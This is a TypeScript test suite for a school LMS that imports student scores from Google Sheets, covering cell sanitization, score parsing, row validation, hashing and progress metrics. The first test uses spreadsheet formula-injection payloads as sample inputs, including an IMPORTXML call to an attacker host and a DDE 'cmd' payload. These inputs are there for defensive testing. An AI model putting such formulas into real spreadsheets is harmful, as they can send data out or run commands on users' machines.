import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { sanitizeSheetCell, sanitizeSheetRows } from "../src/lib/google-workspace";
import {
  computeAttemptPayloadHash,
  computeTransparentStudentMetrics,
  normalizeScore,
  parseAndValidateSheetRow,
  parseStrictScore,
  parseVietnamTimestamp,
} from "../src/lib/sheets-import-pipeline";

describe("Google Sheets Formula Sanitization & Import Pipeline + Transparent Metrics (Section 7 & LMS_DATA_DESIGN.md)", () => {
  it("neutralizes Spreadsheet Formula Injection (=, +, -, @, tab, CR) by prefixing apostrophe", () => {
    assert.equal(sanitizeSheetCell("=IMPORTXML('http://evil.com','//*')"), "'=IMPORTXML('http://evil.com','//*')");
    assert.equal(sanitizeSheetCell("+cmd|' /C calc'!A0"), "'+cmd|' /C calc'!A0");
    assert.equal(sanitizeSheetCell("-2+3"), "'-2+3");
    assert.equal(sanitizeSheetCell("@SUM(A1:A5)"), "'@SUM(A1:A5)");
    assert.equal(sanitizeSheetCell("\t=1+1"), "'\t=1+1");
    assert.equal(sanitizeSheetCell("Nguyễn Minh Anh"), "Nguyễn Minh Anh");

    const rows = sanitizeSheetRows([["=1+1", "Bình thường", 8.5]]);
    assert.deepEqual(rows, [["'=1+1", "Bình thường", "8.5"]]);
  });

  it("never confuses 0 with null in parseStrictScore and supports both comma and dot decimals", () => {
    assert.equal(parseStrictScore(""), null);
    assert.equal(parseStrictScore("   "), null);
    assert.equal(parseStrictScore(null), null);
    assert.equal(parseStrictScore(undefined), null);
    assert.equal(parseStrictScore("N/A"), null);

    // 0 is a valid real score, distinct from null!
    assert.equal(parseStrictScore(0), 0);
    assert.equal(parseStrictScore("0"), 0);
    assert.equal(parseStrictScore("0,0"), 0);
    assert.equal(parseStrictScore("0.0"), 0);

    // Comma and dot decimals
    assert.equal(parseStrictScore("8,5"), 8.5);
    assert.equal(parseStrictScore("8.5"), 8.5);
    assert.ok(Number.isNaN(parseStrictScore("abc")));
  });

  it("normalizes 8/10 and 80/100 identically on both scale 10 and scale 100", () => {
    const scale10 = normalizeScore(8, 10);
    const scale100 = normalizeScore(80, 100);
    assert.equal(scale10.normalizedScore10, 8.0);
    assert.equal(scale100.normalizedScore10, 8.0);
    assert.equal(scale10.normalizedScore100, 80.0);
    assert.equal(scale100.normalizedScore100, 80.0);
  });

  it("validates sheet rows strictly: requires record_id, rejects blank score, rejects max_score <= 0, rejects started_at > submitted_at", () => {
    // Missing record_id
    const noRecordId = parseAndValidateSheetRow({
      rowNumber: 2,
      student_code: "HS001",
      assessment_code: "QUIZ_TIN7_B1",
      raw_score: "8.5",
      max_score: "10",
    });
    assert.equal(noRecordId.ok, false);
    assert.equal(noRecordId.errorCode, "MISSING_RECORD_ID");

    // Empty score must be rejected (never turned into 0)
    const emptyScore = parseAndValidateSheetRow({
      rowNumber: 3,
      record_id: "REC-001",
      student_code: "HS001",
      assessment_code: "QUIZ_TIN7_B1",
      raw_score: "",
      max_score: "10",
    });
    assert.equal(emptyScore.ok, false);
    assert.equal(emptyScore.errorCode, "MISSING_SCORE");

    // Valid 0 score must be accepted as 0.0
    const zeroScore = parseAndValidateSheetRow({
      rowNumber: 4,
      record_id: "REC-002",
      student_code: "HS001",
      assessment_code: "QUIZ_TIN7_B1",
      raw_score: "0",
      max_score: "10",
      submitted_at: "12/11/2026 14:30:00",
    });
    assert.equal(zeroScore.ok, true);
    assert.equal(zeroScore.parsed?.rawScore, 0);
    assert.equal(zeroScore.parsed?.normalizedScore10, 0);

    // Invalid time order (started_at > submitted_at)
    const badTime = parseAndValidateSheetRow({
      rowNumber: 5,
      record_id: "REC-003",
      student_code: "HS001",
      assessment_code: "QUIZ_TIN7_B1",
      raw_score: "7,5",
      max_score: "10",
      started_at: "2026-11-12T15:00:00+07:00",
      submitted_at: "2026-11-12T14:00:00+07:00",
    });
    assert.equal(badTime.ok, false);
    assert.equal(badTime.errorCode, "INVALID_TIME_ORDER");
  });

  it("produces identical payloadHash when spreadsheet rows are reordered (rowNumber ignored in key & hash)", () => {
    const rowAtLine2 = parseAndValidateSheetRow({
      rowNumber: 2,
      record_id: "REC-STABLE-100",
      student_code: "HS001",
      assessment_code: "QUIZ_TIN7_B1",
      raw_score: "8,0",
      max_score: "10",
      submitted_at: "2026-11-12T08:00:00+07:00",
    });
    const rowMovedToLine45 = parseAndValidateSheetRow({
      rowNumber: 45,
      record_id: "REC-STABLE-100",
      student_code: "HS001",
      assessment_code: "QUIZ_TIN7_B1",
      raw_score: "8.0",
      max_score: "10",
      submitted_at: "2026-11-12T08:00:00+07:00",
    });

    assert.equal(rowAtLine2.ok, true);
    assert.equal(rowMovedToLine45.ok, true);
    assert.equal(
      rowAtLine2.parsed!.sourceRecordId,
      rowMovedToLine45.parsed!.sourceRecordId
    );

    const hash1 = computeAttemptPayloadHash({
      studentUserId: "user-1",
      assessmentCode: rowAtLine2.parsed!.assessmentCode,
      assessmentVersion: rowAtLine2.parsed!.assessmentVersion,
      attemptNumber: rowAtLine2.parsed!.attemptNumber,
      rawScore: rowAtLine2.parsed!.rawScore,
      maxScore: rowAtLine2.parsed!.maxScore,
      submittedAtIso: rowAtLine2.parsed!.submittedAt.toISOString(),
      status: rowAtLine2.parsed!.status,
    });
    const hash2 = computeAttemptPayloadHash({
      studentUserId: "user-1",
      assessmentCode: rowMovedToLine45.parsed!.assessmentCode,
      assessmentVersion: rowMovedToLine45.parsed!.assessmentVersion,
      attemptNumber: rowMovedToLine45.parsed!.attemptNumber,
      rawScore: rowMovedToLine45.parsed!.rawScore,
      maxScore: rowMovedToLine45.parsed!.maxScore,
      submittedAtIso: rowMovedToLine45.parsed!.submittedAt.toISOString(),
      status: rowMovedToLine45.parsed!.status,
    });
    assert.equal(hash1, hash2);
  });

  it("classifies aggregate summary rows as SUMMARY without fabricating individual attempts", () => {
    const summaryRow = parseAndValidateSheetRow({
      rowNumber: 10,
      record_id: "SUM-HS001-QUIZ1",
      row_type: "SUMMARY",
      student_code: "HS001",
      assessment_code: "QUIZ_TIN7_B1",
      attempt_count: 4,
      raw_score: "8.5",
      max_score: "10",
    });
    assert.equal(summaryRow.ok, true);
    assert.equal(summaryRow.parsed?.kind, "SUMMARY");
    assert.equal(summaryRow.parsed?.attemptCount, 4);
    assert.equal(summaryRow.parsed?.normalizedScore10, 8.5);
  });

  it("computes transparent student metrics: null when 0 attempts, improvement=null when 1 attempt, accurate improvement when >=2 attempts across mixed scales", () => {
    // 0 attempts -> all null, INSUFFICIENT_DATA
    const emptyMetrics = computeTransparentStudentMetrics([]);
    assert.equal(emptyMetrics.validAttemptCount, 0);
    assert.equal(emptyMetrics.firstScore, null);
    assert.equal(emptyMetrics.latestScore, null);
    assert.equal(emptyMetrics.bestScore, null);
    assert.equal(emptyMetrics.meanScore, null);
    assert.equal(emptyMetrics.improvement, null);
    assert.equal(emptyMetrics.insightType, "INSUFFICIENT_DATA");

    // 1 attempt with score 0/10 -> preserved as 0 (not null!), improvement is null
    const singleZero = computeTransparentStudentMetrics([
      {
        attemptNumber: 1,
        rawScore: 0,
        maxScore: 10,
        submittedAt: "2026-11-10T08:00:00Z",
        status: "SUBMITTED",
      },
    ]);
    assert.equal(singleZero.validAttemptCount, 1);
    assert.equal(singleZero.firstScore, 0);
    assert.equal(singleZero.latestScore, 0);
    assert.equal(singleZero.improvement, null);
    assert.equal(singleZero.insightType, "NEEDS_ATTENTION");

    // 3 attempts across mixed scales: 6/10 (6.0), 80/100 (8.0), 9/10 (9.0)
    const multiMetrics = computeTransparentStudentMetrics([
      {
        attemptNumber: 1,
        rawScore: 6,
        maxScore: 10,
        submittedAt: "2026-11-10T08:00:00Z",
        status: "SUBMITTED",
      },
      {
        attemptNumber: 2,
        rawScore: 80,
        maxScore: 100,
        submittedAt: "2026-11-11T08:00:00Z",
        status: "ACCEPTED",
      },
      {
        attemptNumber: 3,
        rawScore: 9,
        maxScore: 10,
        submittedAt: "2026-11-12T08:00:00Z",
        status: "SUBMITTED",
      },
    ]);
    assert.equal(multiMetrics.validAttemptCount, 3);
    assert.equal(multiMetrics.firstScore, 6.0);
    assert.equal(multiMetrics.latestScore, 9.0);
    assert.equal(multiMetrics.bestScore, 9.0);
    assert.equal(multiMetrics.meanScore, 7.67);
    assert.equal(multiMetrics.improvement, 3.0);
    assert.equal(multiMetrics.insightType, "IMPROVING");
  });

  it("parses Vietnam timestamps (+07:00) consistently", () => {
    const d = parseVietnamTimestamp("12/11/2026 09:15:00");
    assert.ok(d instanceof Date);
    assert.equal(d?.toISOString(), "2026-11-12T02:15:00.000Z");
  });
});

